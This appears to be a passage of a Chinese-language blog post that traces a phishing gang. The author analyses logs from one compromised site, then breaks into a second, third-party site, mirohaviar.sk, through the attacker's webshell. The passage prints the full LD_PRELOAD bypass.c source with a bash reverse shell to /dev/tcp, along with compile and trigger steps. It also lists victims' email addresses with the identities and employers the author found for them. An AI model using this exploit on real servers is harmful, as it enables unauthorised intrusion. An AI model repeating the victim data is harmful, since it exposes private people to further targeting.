-rw-rw---- 1 48 6313 1.9K 11月 21 14:43 rosturplast.com.error.log-20181122
-rw-rw---- 1 48 6313 1.9K 11月 23 02:30 rosturplast.com.error.log-20181123
-rw-rw---- 1 48 6313 5.0K 11月 24 01:46 rosturplast.com.error.log-20181124
-rw-rw---- 1 48 6313 8.3K 11月 25 02:07 rosturplast.com.error.log-20181125
-rw-rw---- 1 48 6313 2.3K 11月 26 05:05 rosturplast.com.error.log-20181126
-rw-rw---- 1 48 6313 4.1K 11月 27 05:34 rosturplast.com.error.log-20181127
-rw-rw---- 1 48 6313 550K 11月 28 08:35 rosturplast.com.error.log-20181128
-rw-rw---- 1 48 6313 6.5M 11月 29 07:51 rosturplast.com.error.log-20181129
-rw-rw---- 1 48 6313 1.4M 11月 30 08:38 rosturplast.com.error.log-20181130
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;用D盾扫网站文件，发现这个网站已成跑马场。 &lt;img src=&#34;https://camo.githubusercontent.com/83e5501754f57697062e2425370decab4fbbdc0f/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6566693166796e35697639786b376e3634357a7a6a386a302f323031382d31312d333025323031372d30302d32382545352542312538462545352542392539352545362538382541412545352539422542452e706e67&#34; alt=&#34;2018-11-30 17-00-28屏幕截图.png-59.9kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;攻击者在&lt;code&gt;shells/&lt;/code&gt;目录下放置钓鱼文件和PHP后门。&lt;/strong&gt; &lt;img src=&#34;https://camo.githubusercontent.com/9a4f890d71c4c578640b1d3dad63fb24a34b4e61/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6d3270776b39386b323873397979327371307635716635702f726f73747572706c6173742e636f6d2d7368656c6c732d6c732e706e67&#34; alt=&#34;rosturplast.com-shells-ls.png-306.7kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看哪些IP访问了后门并统计次数&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查询攻击者IP地址&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; ⚡ root@kali  /tmp/rosturplast.com/log  grep &amp;quot;/shells/&amp;quot; * |grep &amp;quot;php&amp;quot; | awk -F &amp;quot;:&amp;quot; &#39;{print $2}&#39; |awk &#39;{a[$1]+=1;} END {for(i in a){print a[i]&amp;quot; &amp;quot;i;}}&#39; |sort -t &amp;quot; &amp;quot; -k 1 -n -r  &amp;gt;ip.txt
 
26 174.85.145.99
20 50.73.252.169
10 213.233.104.120
2 207.228.149.69
2 195.211.23.207
2 129.205.113.8
 ⚡ root@kali  /tmp/rosturplast.com/log  for line in $(&amp;lt;ip.txt); do curl https://ip.cn/\?ip\=$line ; done

IP: 174.85.145.99 来自: 美国 
IP: 50.73.252.169 来自: 美国 
IP: 213.233.104.120 来自: 罗马尼亚 
IP: 207.228.149.69 来自: 百慕大 
IP: 195.211.23.207 来自: 俄罗斯 
IP: 129.205.113.8 来自: 尼日利亚
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;根据后门文件名，匹配Apache访问日志得到攻击者的代理IP和User Agent&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; ⚡ root@kali  /tmp  grep &amp;quot;/shells&amp;quot; *| grep &amp;quot;php&amp;quot; |grep &amp;quot;POST&amp;quot; |awk -F &amp;quot;:&amp;quot; &#39;{print $2 $6}&#39; |sort |uniq
 
129.205.113.8 - - [30/Nov/2018//www.rosturplast.com/shells/config.php&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36&amp;quot;
174.85.145.99 - - [27/Nov/2018//www.rosturplast.com/shells/config.php&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&amp;quot;
207.228.149.69 - - [28/Nov/2018//www.rosturplast.com/shells/config.php&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&amp;quot;
213.233.104.120 - - [27/Nov/2018//www.rosturplast.com/shells//bacu.php&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv
50.73.252.169 - - [29/Nov/2018//www.rosturplast.com/shells/config.php&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;通过日志匹配邮箱并去重得到受害者邮箱地址&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;egrep &#39;[0-Z_]{1,}@[0-Z]{1,}(\.[0-Z]{1,})+&#39; *  | awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; |awk -F &amp;quot;HTTP&amp;quot; &#39;{print $1}&#39; |awk -F &amp;quot;ml=&amp;quot; &#39;{print $2}&#39; |sort |uniq
 ⚡ root@kali  /tmp  egrep &#39;[0-Z_]{1,}@[0-Z]{1,}(\.[0-Z]{1,})+&#39; *  | awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; |awk -F &amp;quot;HTTP&amp;quot; &#39;{print $1}&#39; |awk -F &amp;quot;ml=&amp;quot; &#39;{print $2}&#39; |sort |uniq

alexsin54@yahoo.com             //攻击者邮箱  
clavenda.payman@lbdi.net        //利比亚发展投行CFO
dennis@rayfields.co.za          //域名失效
georges.raad@nera.net           //新加坡IT基础设施提供商员工
gthakkar@sscinc.com             //美国SS&amp;amp;C Technologies, Inc. （印度分公司）
jasonchowan223@gmail.com        //攻击者邮箱
******@******.com               //同事
jiajie.lim@cimb.com             //马来西亚联昌国际银行员工
kohchinbeng@bdo.com.sg          //新加坡立信会计师事务所员工
mayfaithlee@hotmail.com         //未知
philip@beekoo.hk                //深圳市很有蜂格网络科技有限公司CEO
Point72.IR@sscinc.com           //美国SS&amp;amp;C Technologies, Inc.
shunweicapital@sscinc.com       //美国SS&amp;amp;C Technologies, Inc.（疑似顺为资本）
url@email.com                   //无效
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h3 id=&#34;35-受害者身份识别&#34;&gt;3.5 受害者身份识别&lt;/h3&gt;
&lt;p&gt;通过搜索引擎对这15个受害者邮箱进行身份识别。&lt;/p&gt;
&lt;h4 id=&#34;351-alexsin54yahoocommailtoalexsin54yahoocom--jasonchowan223gmailcommailtojasonchowan223gmailcom&#34;&gt;3.5.1 &lt;a href=&#34;mailto:alexsin54@yahoo.com&#34;&gt;alexsin54@yahoo.com&lt;/a&gt; / &lt;a href=&#34;mailto:jasonchowan223@gmail.com&#34;&gt;jasonchowan223@gmail.com&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;mailto:alexsin54@yahoo.com&#34;&gt;alexsin54@yahoo.com&lt;/a&gt;：攻击者欺诈账户，曾被举报过，在这里攻击者用来作钓鱼测试。 &lt;a href=&#34;mailto:jasonchowan223@gmail.com&#34;&gt;jasonchowan223@gmail.com&lt;/a&gt;：通过钓鱼程序配置文件获得。 &lt;code&gt;./logon.secureaccess/mail.php:$mail=&amp;quot;jasonchowan223@gmail.com&amp;quot;;&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;来源：http://www.payer.org/test/ 来源：https://avoidaclaim.com/2018/debt-collection-fraud-using-the-name-yeung-alexander-luk/ &lt;img src=&#34;https://camo.githubusercontent.com/2d6cd91991c67a8b9157ef3633c7974fd33fb988/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f3774653876653538746765317472656f78766276387075702f616c657873696e3534407961686f6f2e636f6d2d2545362541432542412545382541462538382545382542342541362545362538382542372e706e67&#34; alt=&#34;alexsin54@yahoo.com-欺诈账户.png-124.7kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/609e25fceb042f012c07f1f8a11b6da8c5e0e292/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f71627833377631696e30306b6f7436366662386b6a7877692f616c657873696e3534407961686f6f2e636f6d2d254536254143254241254538254146253838254538254234254136254536253838254237322e706e67&#34; alt=&#34;alexsin54@yahoo.com-欺诈账户2.png-196.4kB&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;352-clavendapaymanlbdinetmailtoclavendapaymanlbdinet&#34;&gt;3.5.2 &lt;a href=&#34;mailto:clavenda.payman@lbdi.net&#34;&gt;clavenda.payman@lbdi.net&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Mrs. Clavenda O. PAYMAN 利比亚发展投行（Liberian Bank forDevelopment and nvestment）首席财务官 来源：https://www.adfi-ci.org/downloads/telecharger.php?Fichier_a_telecharger=files/aadfi_doc_en_20130623170205.pdf&amp;amp;chemin=&amp;amp;id=91 &lt;img src=&#34;https://camo.githubusercontent.com/fa369fd05fb3df0edb2e53be3fbe0a086922ff77/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f347439687a746c307a6178627835707030343139773575382f636c6176656e64612e7061796d616e406c6264692e6e65742d312e706e67&#34; alt=&#34;clavenda.payman@lbdi.net-1.png-86kB&#34;&gt; &lt;img src=&#34;https://camo.githubusercontent.com/93048eb1aaf1f94e5a0fcf5bdaa3fc09cda64f22/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f63797a71396c66687735746135716764693578786e6d6c662f636c6176656e64612e7061796d616e406c6264692e6e65742d322e706e67&#34; alt=&#34;clavenda.payman@lbdi.net-2.png-169.6kB&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;353-georgesraadneranetmailtogeorgesraadneranet&#34;&gt;3.5.3 &lt;a href=&#34;mailto:georges.raad@nera.net&#34;&gt;georges.raad@nera.net&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;疑似新加坡 Nera Telecommunications Ltd（IT基础设施提供商）公司员工 来源：http://www.nera.net/about-us.html&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;354-gthakkarsscinccommailtogthakkarsscinccom&#34;&gt;3.5.4 &lt;a href=&#34;mailto:gthakkar@sscinc.com&#34;&gt;gthakkar@sscinc.com&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;美国SS&amp;amp;C Technologies, Inc. &amp;amp; 印度金融服务公司 Globeop Financial Services Technologies (India) Private Limited 来源：https://www.instafinancials.com/company/globeop-financial-services-india-private-limited/U67100MH2003PTC141044&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;来源： [http://www.seepz.gov.in/writereaddatafolder/Regional%20Governing%20Council%20of%20EPCES%20for%202016-18.pdf](&lt;a href=&#34;http://www.seepz.gov.in/writereaddatafolder/Regional&#34;&gt;http://www.seepz.gov.in/writereaddatafolder/Regional&lt;/a&gt; Governing Council of EPCES for 2016-18.pdf) &lt;img src=&#34;https://camo.githubusercontent.com/656310c98999c25975f5b90c343ad66350a470c8/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6a727078696b6169326a306a7473716273713632337663332f677468616b6b617240737363696e632e636f6d312e706e67&#34; alt=&#34;gthakkar@sscinc.com1.png-169.5kB&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;355-jiajielimcimbcommailtojiajielimcimbcom&#34;&gt;3.5.5 &lt;a href=&#34;mailto:jiajie.lim@cimb.com&#34;&gt;jiajie.lim@cimb.com&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;马来西亚联昌国际银行员工（CIMB Group） 来源：https://www.cimb.com/en/who-we-are.html&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;356-kohchinbengbdocomsgmailtokohchinbengbdocomsg&#34;&gt;3.5.6 &lt;a href=&#34;mailto:kohchinbeng@bdo.com.sg&#34;&gt;kohchinbeng@bdo.com.sg&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;KOH CHIN BENG 新加坡立信会计师事务所员工&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;来源：https://www.bdo.com.sg/en-gb/our-people/koh-chin-beng &lt;img src=&#34;https://camo.githubusercontent.com/d1ec2881944f4d08a06d1e2db88665e16500cb49/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f336f6f37767a75717866387a73346130776c316d3432726a2f6b6f686368696e62656e674062646f2e636f6d2e73672d312e706e67&#34; alt=&#34;kohchinbeng@bdo.com.sg-1.png-263.7kB&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h4 id=&#34;357-philipbeekoohkmailtophilipbeekoohk&#34;&gt;3.5.7 &lt;a href=&#34;mailto:philip@beekoo.hk&#34;&gt;philip@beekoo.hk&lt;/a&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;深圳市很有蜂格网络科技有限公司 CEO 来源：https://m.zhipin.com/job_detail/1407383492.html 来源：https://www.tianyancha.com/company/2349004659 &lt;img src=&#34;https://camo.githubusercontent.com/ae11cf0cea5616cb7ebe59fa32322eac7fe35473/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f7964623361376f306e35356a33713832776f6478657431672f7068696c6970406265656b6f6f2e686b2d312e706e67&#34; alt=&#34;philip@beekoo.hk-1.png-101.3kB&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;四渗透邮件发送网站&#34;&gt;四、渗透邮件发送网站&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;目标：mirohaviar.sk ，这是一个博客网站&lt;/p&gt;
&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h3 id=&#34;41-漏洞扫描&#34;&gt;&lt;strong&gt;4.1 漏洞扫描&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;服务器信息如下:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;[+] HOST: mirohaviar.sk（85.248.229.150 斯洛伐克） [+] OS: Debian 7 [+] Web Server:Apache/2.2.22 PHP/5.2.6-1+lenny16 [+] CMS: Joomla 1.5 &lt;img src=&#34;https://camo.githubusercontent.com/9ac926c8d659617a37c00a42a73ebcf8d697c1bf/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6563626c63756e616875626973737a36676863386f6970742f6e6d61702d6d69726f6861766961722e736b2d312e706e67&#34; alt=&#34;nmap-mirohaviar.sk-1.png-123.2kB&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/ca7876c11cad706f5751e457ad5612fa2c36038e/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f706c6135763177796f3337683035746c6e326272777135772f6a6f6f6d7363616e2d316d69726f6861766961722e736b2e706e67&#34; alt=&#34;joomscan-1mirohaviar.sk.png-660.5kB&#34;&gt; CMS漏洞扫描得到图示的漏洞信息，经过测试全部无法利用，其他端口也没有发现可以利用的的漏洞，看来攻击者也是一个勤奋的同学，入侵成功后做了相应的修复和加固，看起来毫无办法，好像只能旁站或者C段渗透了。&lt;/p&gt;
&lt;p&gt;然而有人的地方就有江湖，有黑客入侵过的网站一定有后门。这类利用通用漏洞批量入侵的黑客团伙，后门文件一般都有特征，我根据前一个网站获得的php后门文件名列表，批量访问当前网站得到了三个相同的后门文件。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/f170862127885433b06e28df5af6886872986333/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f6d303834396433697631386f386c396779766a36776f32722f726f73747572706c6173742e636f6d2d7368656c6c732d312e706e67&#34; alt=&#34;rosturplast.com-shells-1.png-169.4kB&#34;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; ⚡ root@kali  /tmp/rosturplast.com/webroot/shells  md5sum *         
724e7316427151ea1f449f38a28f642c  406.php
3e8a7cf7049e8b9ab8dfca7d3c827c4a  aaaa
aaf775b99997c166ff45677806d809de  an.php
e5c06f1f66781ba5c39d909096c4cd47  a.txt
f71ad06982064b125d155b6f601198b8  bacu.php
f2d7553b97d8e0a0258e48c3ca42a7d2  baer.php
c01a0691c484a8d00977a100d8706b50  cfg.php
e5c06f1f66781ba5c39d909096c4cd47  config.php
md5sum: logon.secureaccess: 是一个目录
983ba05973b84e33e76916ca0dabedec  new2bug.txt
1c014f955a67974dc779100c13162f1a  priv8.php
2a73dda7ebb3b8d1c0d094b79623e9ff  setup.php
80b5dadd0a9856f1e6d950843140d24e  switch-security.php
48f50fb676028e0ae82f3f2db4e26247  unzipper.php
51f0bba7ec30b8778dca19ead016a58f  webapp365.zip
58d1d66c0be0739319156702522b1b52  wso.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;相同文件名如下：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://www.mirohaviar.sk/config.php
http://www.mirohaviar.sk/an.php
http://www.mirohaviar.sk/bacu.php  Pro Mailer V2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中 &lt;code&gt;http://www.mirohaviar.sk/config.php &lt;/code&gt;是攻击者的加密WebShell，理论上只需解密获得密码就能登录这个后门。&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;42-解密webshell&#34;&gt;&lt;strong&gt;4.2 解密WebShell&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;解密过程如下&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; config.php 

//去除头尾多余字符，得到base64密文。
awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; config.php| base64 -d -i|awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; |sed &#39;s/\\x//g&#39; |tr -d &#39;\\&#39;

//第一次base64解码，得到16进制密文
awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; config.php| base64 -d -i|awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; |sed &#39;s/\\x//g&#39; |tr -d &#39;\\&#39; |xxd -r -p

//第二次hex解码，得到base64密文
awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; config.php| base64 -d -i|awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; |sed &#39;s/\\x//g&#39; |tr -d &#39;\\&#39; |xxd -r -p |base64 -d -i |awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39;

//第三次base64解码，得到base64密文
awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; config.php| base64 -d -i|awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; |sed &#39;s/\\x//g&#39; |tr -d &#39;\\&#39; |xxd -r -p |base64 -d -i |awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; |base64 -d -i |awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; 

//第四次base64解码，得到base64密文
awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; config.php| base64 -d -i|awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; |sed &#39;s/\\x//g&#39; |tr -d &#39;\\&#39; |xxd -r -p |base64 -d -i |awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; |base64 -d -i |awk -F &amp;quot;\&amp;quot;&amp;quot; &#39;{print $2}&#39; |base64 -d -i

//第五次base64解码，得到明文
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/91c831cddedde7575147bfb16062001dc54bc8a6/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f746c62656d746a6137617476727635326f787675776b63702f504850254535253930253845254539253937254138254538254137254133254535254146253836254538254246253837254537254138253842312e706e67&#34; alt=&#34;PHP后门解密过程1.png-3103.9kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到后门密码hash（MD5），解密后得到明文: root （饶了个大弯原来是个弱口令，下次遇到这类先跑一下密码）&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$auth_pass = &amp;quot;63a9f0ea7bb98050796b649e85481845&amp;quot;;  
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/68009baa8d19ffc87cfa5e7bc1b269ff903adf0e/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f666e3264347234356872667835393638316a64676576346d2f323031392d30312d323425323031322d32322d34312545352542312538462545352542392539352545362538382541412545352539422542452e706e67&#34; alt=&#34;2019-01-24 12-22-41屏幕截图.png-17.3kB&#34;&gt;&lt;/p&gt;
&lt;p&gt;这个后门有点皮，做了UserAgent判断，我浏览器默认设置的UA是Googlebot，访问显示404，这是反搜索引擎爬虫的惯用手段，所以我换了个正常浏览器的UA访问得到正常页面。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if(!empty($_SERVER[&#39;HTTP_USER_AGENT&#39;])) {
    $userAgents = array(&amp;quot;Google&amp;quot;, &amp;quot;Slurp&amp;quot;, &amp;quot;MSNBot&amp;quot;, &amp;quot;ia_archiver&amp;quot;, &amp;quot;Yandex&amp;quot;, &amp;quot;Rambler&amp;quot;);
    if(preg_match(&#39;/&#39; . implode(&#39;|&#39;, $userAgents) . &#39;/i&#39;, $_SERVER[&#39;HTTP_USER_AGENT&#39;])) {
        header(&#39;HTTP/1.0 404 Not Found&#39;);
        exit;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/c745fab220976e1a2be673b1a1e15b9f5a8b3bca/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f31326a6e6e356b6d646c3531656939693569757375636a752f6d69726f6861766961722e736b2d636f6e6669672e7068702d7368656c6c2e706e67&#34; alt=&#34;mirohaviar.sk-config.php-shell.png-13.4kB&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;43-提权&#34;&gt;&lt;strong&gt;4.3 提权&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;通过webshell得到了具体系统信息，下一步尝试提权，目的是获得Apache的web访问日志。 &lt;img src=&#34;https://camo.githubusercontent.com/5bc2f556801c428b1be596b3b3285a117c896c69/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f77686d746e6e62657967767372676b327065653765747a692f6d69722d737973696e666f2e706e67&#34; alt=&#34;mir-sysinfo.png-118.7kB&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;431-突破disable_functions&#34;&gt;&lt;strong&gt;4.3.1 突破disable_functions&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;测试发现目标限制跨目录（open_basedir），并禁用了命令执行函数，导致WebShell权限下，无法跨目录访问也无法执行命令。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;disable_functions：	 escapeshellarg,escapeshellcmd,exec,passthru,proc_close,proc_get_status,proc_nice,proc_open,proc_terminate,shell_exec,system,popen,pcntl_exec	

open_basedir：	/storage/www/mirohaviar.sk/:/storage/www-include/:/usr/share/php5/:/usr/share/file/:/usr/share/pear/:/tmp/
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://camo.githubusercontent.com/077ec2e3512180e66c59f6eb86f2a047afa196e5/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f7a6e3779656c65317a3579356c66727071717a6e696163762f6d69722d64697361626c655f66756e6374696f6e732e706e67&#34; alt=&#34;mir-disable_functions.png-60.7kB&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;突破的手段很多，这里我利用LD_PRELOAD动态链接来劫持php的mail函数突破disable_functions执行系统命令。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;查看sendmail函数在执行过程中动态调用哪些标准库函数。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@m7web1:/tmp$ readelf -Ws /usr/sbin/sendmail 
Symbol table &#39;.dynsym&#39; contains 420 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __printf_chk@GLIBC_2.3.4 (2)
     2: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getegid@GLIBC_2.2.5 (3)
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND dane_raw_tlsa@DANE_0_0 (4)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gnutls_ocsp_resp_print@GNUTLS_3_4 (5)
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gnutls_x509_crt_get_serial@GNUTLS_3_4 (5)
     6: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __errno_location@GLIBC_2.2.5 (3)
     7: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND gnutls_db_set_cache_expiration@GNUTLS_3_4 (5)
     8: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND sendto@GLIBC_2.2.5 (3)

     ......

     76: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND getuid@GLIBC_2.2.5 (3)
     77: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND send@GLIBC_2.2.5 (3)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;从中选取geteuid函数进行测试，编写动态链接程序bypass.c&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#include&amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;    
#include&amp;lt;string.h&amp;gt; 
void payload() {
    system(&amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/xxx.xxx.xxx.xxx/999 0&amp;gt;&amp;amp;1&amp;quot;);
}  
int geteuid() {
if(getenv(&amp;quot;LD_PRELOAD&amp;quot;) == NULL) { return 0; }
unsetenv(&amp;quot;LD_PRELOAD&amp;quot;);
payload();
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当这个共享库中的geteuid被调用时，尝试加载payload()函数，执行命令调用system执行一个反弹shell的操作（xxx.xxx.xxx.xxx即是我的公网服务器IP）&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;编译&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;gcc -c -fPIC bypass.c -o bypass
gcc -shared bypass.c -o bypass.so
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;上传&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@m7web1:/tmp$ cat b64.txt|base64 -d &amp;gt;bypass.so
www-data@m7web1:/tmp$ file bypass.so
file bypass.so
bypass.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;执行&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;bypass.php&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
putenv(&amp;quot;LD_PRELOAD=/tmp/bypass.so&amp;quot;);
mail(&amp;quot;test@localhost&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;,&amp;quot;&amp;quot;);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;浏览器访问&lt;code&gt;http://www.mirohaviar.sk/bypass.php&lt;/code&gt;页面后成功执行命令，得到了一个www-user权限的反弹shell。 &lt;img src=&#34;https://camo.githubusercontent.com/24f7d365ddf74f60c1587db65f8379591652cfb1/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f626d64776a356f356b3666697a7536746f6f74393035626c2f6d69722d6e632e706e67&#34; alt=&#34;mir-nc.png-57.1kB&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;432-发现行踪&#34;&gt;&lt;strong&gt;4.3.2 发现行踪&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;仔细看这是一家斯洛伐克的网络公司，这台服务器上面托管了五百多个网站，当前的权限可以访问这些网站的文件和数据库，令人遗憾的的是apache日志目录&lt;code&gt;/var/log/apache2/&lt;/code&gt;无权限访问。 &lt;img src=&#34;https://camo.githubusercontent.com/1cd834841a3b7268ec4468bba923e042ec1e1b48/687474703a2f2f7374617469632e7a7962756c756f2e636f6d2f62616971692f386e32626a6c6f7473706a34626f6f346a6e6c65787666312f6d69722d736974652e706e67&#34; alt=&#34;mir-site.png-112.8kB&#34;&gt;&lt;/p&gt;
